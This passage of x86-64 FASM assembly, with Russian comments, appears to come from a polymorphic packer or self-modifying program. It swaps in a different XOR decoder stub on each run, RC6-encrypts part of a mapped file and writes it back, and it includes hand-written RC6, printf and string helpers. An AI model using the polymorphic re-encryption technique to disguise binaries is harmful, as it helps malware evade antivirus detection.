		mov			edi, [r15 + options_t.offset_start]
		fastcall	changeXorCode, [r14 + rdi], [r14 + rsi], dword[r14 + rdx]

		; Иницилизируем новый для шифрования
		mov			edi, [r15 + options_t.offset_time_stamp]
		mov			rax, [r15 + options_t.rc6_init]
		fastcall	rax, [r14 + rdi], [S], KEY_LEN

		; Зашифруем с помощью rc6
		mov			r10d, [r15 + options_t.offset_rc6_start]
		mov			ecx, [r15 + options_t.rc6_size]
		fastcall	rc6_encrypt, [S], [r14 + r10], [r14 + r10], rcx

		; XOR на наш код - чтобы был разный каждый раз
		mov			esi, [r15 + options_t.offset_xor]
		mov			edi, [r15 + options_t.offset_xor_end]
		mov			eax, [r15 + options_t.offset_time_stamp]
		lea			rsi, [r14 + rsi]
		lea			rdi, [r14 + rdi]
		mov			rax, [r14 + rax]
		@@:
		cmp			rsi, rdi
		je			@f
		xor			[rsi], rax
		add			rsi, 0x8
		jmp			@b
		@@:

		; Сместим указатель записи в файле в 0x0
		syscall		__NR_lseek, ebx, 0x0, SEEK_SET
		test		rax, rax
		js			.ret_close_mmap

		syscall		__NR_write, ebx, r13, r12
		test		rax, rax
		js			.ret_close_mmap

	.ret_close_mmap:
		syscall		__NR_munmap, r13, r12
		debug_M

	.ret_close:
		syscall		__NR_close, ebx
		debug_M
	
	.ret:
		ret
	.debug_msg db 'DEBUGGING..%x %x',0xA,0
	endp

	; rdx - time_stamp 
	; rsi - указатель на таблицу готовых xor
	; rdi - указатель на память где перепишим xor
	proc changeXorCode uses
		locals
		endl

		and			rdx, SIZE_XOR_CODE_AND
		cmp			dl, [xor_old_id]
		jne			.replace_code
		add			dl, 0x1
		and			dl, SIZE_XOR_CODE_AND

	.replace_code:
		mov			eax, SIZE_XOR_CODE
		mul			edx
		add			rsi, rdx
		mov			cl, SIZE_XOR_CODE
		@@:
		mov			al, [rsi]
		inc			rsi
		mov			[rdi], al
		inc			rdi
		dec			cl
		jnz			@b
		ret
	endp

; void rc6_encrypt(RC6_WORD *S, const RC6_WORD *in, RC6_WORD *out, size_t num_block)
; rcx = size_t num_block
; rdx = RC6_WORD *out
; rsi = const RC6_WORD *in
; rdi = RC6_WORD *S
rc6_encrypt:
	push		rbx, r12, r13, r14
	;rsi = in
	;rdi = S
	;r8 = out
	;r9 = num_block
	mov			r9, rcx
	mov			r8, rdx
	.loop:
	test		r9, r9
	jz			.finish
	; r11 = a
	; r12 = b
	; r13 = c
	; r14 = d
	; Обнулим сначало, что бы можно было копировать в другие регистры и сохранить совместимость для разных размеров слов
	xor			eax, eax
	xor			edx, edx
	xor			ecx, ecx
	xor			ebx, ebx
	mov			RC6_WORD_RAX, [rsi + (0x0) * RC6_WORD_SIZE]
	mov			RC6_WORD_RDX, [rsi + (0x1) * RC6_WORD_SIZE]
	mov			RC6_WORD_RCX, [rsi + (0x2) * RC6_WORD_SIZE]
	mov			RC6_WORD_RBX, [rsi + (0x3) * RC6_WORD_SIZE]
	add			RC6_WORD_RDX, [rdi + (0x0) * RC6_WORD_SIZE]
	add			RC6_WORD_RBX, [rdi + (0x1) * RC6_WORD_SIZE]
	mov			r11, rax
	mov			r12, rdx
	mov			r13, rcx
	mov			r14, rbx
	;r10 = i
	mov			r10d, 0x2

	.loop_block:
		mov			rax, r12
		mov			rcx, r14
		lea			RC6_WORD_RDX, [RC6_WORD_RAX * 2 + 1]
		lea			RC6_WORD_RBX, [RC6_WORD_RCX * 2 + 1]
		mul			RC6_WORD_RDX
		xchg		rax, rcx
		mul			RC6_WORD_RBX
		rol			RC6_WORD_RCX, RC6_LG
		rol			RC6_WORD_RAX, RC6_LG
		;RC6_WORD_RAX = u
		;RC6_WORD_RCX = t
		; Получим 'c' и 'a'
		;t = ROTL(b * (2 * b + 1), RC6_LG);
		;u = ROTL(d * (2 * d + 1), RC6_LG);
		;a = ROTL(a ^ t, u) + S[i];
		;c = ROTL(c ^ u, t) + S[i + 1];
		mov			rdx, r13;c
		mov			rbx, r11;a
		xor			rdx, rax
		xor			rbx, rcx
		rol			RC6_WORD_RDX, cl
		mov			cl, al
		rol			RC6_WORD_RBX, cl
		add			RC6_WORD_RDX, [rdi + (r10 + 0x1) * RC6_WORD_SIZE]
		add			RC6_WORD_RBX, [rdi + (r10 + 0x0) * RC6_WORD_SIZE]
		;Перемешываем a, b, c, d
		mov			rax, rbx
		mov			r11, r12
		mov			r12, rdx
		mov			r13, r14
		add			r10b, 0x2
		mov			r14, rax
		cmp			r10b, (2 * RC6_R)
		jbe			.loop_block
	; Сохраним расшифрованные данные
	mov			rax, r11
	mov			rcx, r12
	mov			rdx, r13
	mov			rbx, r14
	add			RC6_WORD_RAX, [rdi + (2 * RC6_R + 2) * RC6_WORD_SIZE]
	add			RC6_WORD_RDX, [rdi + (2 * RC6_R + 3) * RC6_WORD_SIZE]
	mov			[r8 + 0x0 * RC6_WORD_SIZE], RC6_WORD_RAX
	mov			[r8 + 0x1 * RC6_WORD_SIZE], RC6_WORD_RCX;
	mov			[r8 + 0x2 * RC6_WORD_SIZE], RC6_WORD_RDX
	mov			[r8 + 0x3 * RC6_WORD_SIZE], RC6_WORD_RBX;
	add			rsi, RC6_WORD_SIZE * 0x4
	add			r8, RC6_WORD_SIZE * 0x4
	dec			r9
	jmp			.loop

	.finish:
	pop			rbx, r12, r13, r14
	ret

	proc printf c uses rbp rbx r12
		locals
			param2		dq ?
			param3		dq ?
			param4		dq ?
			param5		dq ?
			param6		dq ?
			hex			db 0x8 dup ?
		endl

		lea		r12, [param2]
		mov		rbp, rdi
		mov		rbx, rdi
		mov		[r12], rsi
		mov		[param3], rdx
		mov		[param4], rcx
		mov		[param5], r8
		mov		[param6], r9
		jmp		.big_loop
		.big_loop_pre:
			add		r12, 0x8
		.big_loop:
			mov		al, [rbx]
			inc		rbx
			test	al, al
			jz		.finish
			cmp		al, '%'
			jne		.big_loop
			mov		rdx, rbx
			mov		rsi, rbp
			sub		rdx, rbp
			mov		rbp, rbx
			dec		rdx
			jz		@f
			syscall		__NR_write, STDOUT_FILENO, rsi, rdx
			@@:
			mov		al, [rbx]
			inc		rbx
			test	al, al
			jz		.finish
			cmp		al, 'x'
			je		.hex_s
			cmp		al, 'X'
			je		.hex_h
			jmp		.big_loop
	.hex_s:
		lea		r9, [.txt_s]
		jmp		.hex
	.hex_h:
		lea		r9, [.txt_h]
	.hex:
		inc			rbp
		lea			rdx, [hex + hex.sizeof]
		mov			rcx, [r12]
		mov			rsi, rdx
			@@:
			mov			al, cl
			dec			rsi
			and			eax, 0xF
			shr			rcx,4
			mov			al, [r9 + rax]
			mov			[rsi], al
			jnz			@b
		sub			rdx, rsi
		syscall		__NR_write, STDOUT_FILENO, rsi, rdx
		jmp			.big_loop_pre
		.txt_s db '0123456789abcdef'
		.txt_h db '0123456789ABCDEF'

	.finish:
		sub		rbx, rbp
		jz		@f
		syscall		__NR_write, STDOUT_FILENO, rbp, [rbx - 0x1]
		@@:
		ret
	endp

	; int strcmp(const char *s1, const char *s2);
	; rsi = const char *s1
	; rdi = const char *s2
	proc strcmp
		xor			eax, eax
		.loop:
			mov			dl, [rsi]
			mov			dh, [rdi]
			inc			rsi
			inc			rdi
			mov			al, dl
			or			dl, dh
			jz			.finish
			cmp			al, dh
			je			.loop

		.finish:
			sub			al, dh
			ret
	endp

	; size_t strlen(const char *s);
	; rdi = void *s
	proc strlen
		mov		rax, rdi
		@@:
		cmp		byte[rax], 1
		inc		rax
		jnc		@b
	.finish:
		sub		rax, rdi
		ret
	endp

	; void	*memcpy(void *dst, const void *src, size_t n);
	; rdx = size_t n
	; rsi = const void *src
	; rdi = void *dst
	proc memcpy
		mov		rax, rdi
		test	rsi, rsi
		jz		.finish
		test	rdi, rdi
		jz		.finish
		test	rdx, rdx
		jz		.finish
		mov		rcx, rdx
		cld
		rep		movsb

	.finish:
		ret
	endp

	; rdx - сколько символов
	; rsi - число которое преобразовываем
	; rdi - указатель куда писать
	proc numberToHex uses

		mov			rcx, rsi
		lea			r9, [.txt]
		lea			rdi, [rdi + rdx]
		@@:
		mov			al, cl
		dec			rdi
		and			eax, 0xF
		shr			rcx,4
		mov			al, [r9 + rax]
		dec			dl
		mov			[rdi],al
		jnz			@b
		ret
		.txt db '0123456789ABCDEF'
	endp

	; rsi - код ошибки
	; rdi - link там где проверили и произошла ошибка
	proc debug uses
		locals
			hex1 db '0000000000000000'
			hex2 db '0000000000000000'
		endl

		lea			r9, [.txt]
		mov			rcx, rdi
		lea			rdx, [hex1 + hex1.sizeof]
		@@:
		mov			al, cl
		dec			rdx
		and			eax, 0xF
		shr			rcx,4
		mov			al, [r9 + rax]
		mov			[rdx],al
		jnz			@b

		neg			rsi
		mov			rcx, rsi
		lea			rdx, [hex2 + hex2.sizeof]
		@@:
		mov			al, cl
		dec			rdx
		and			eax, 0xF
		shr			rcx,4
		mov			al, [r9 + rax]
		mov			[rdx],al
		jnz			@b

		syscall		__NR_write, STDOUT_FILENO, [.error_start], .error_start.sizeof
		syscall		__NR_write, STDOUT_FILENO, [hex1], hex1.sizeof
		syscall		__NR_write, STDOUT_FILENO, [.error_midle], .error_midle.sizeof
		syscall		__NR_write, STDOUT_FILENO, [hex2], hex2.sizeof
		syscall		__NR_write, STDOUT_FILENO, [.error_end], .error_end.sizeof
		ret
		.error_start db 'Error adress: 0x'
		.error_midle db ' code error:  0x'
		.error_end db ' !!! ', 0xA
		.txt db '0123456789ABCDEF'
	endp

	align 0x10
end namespace
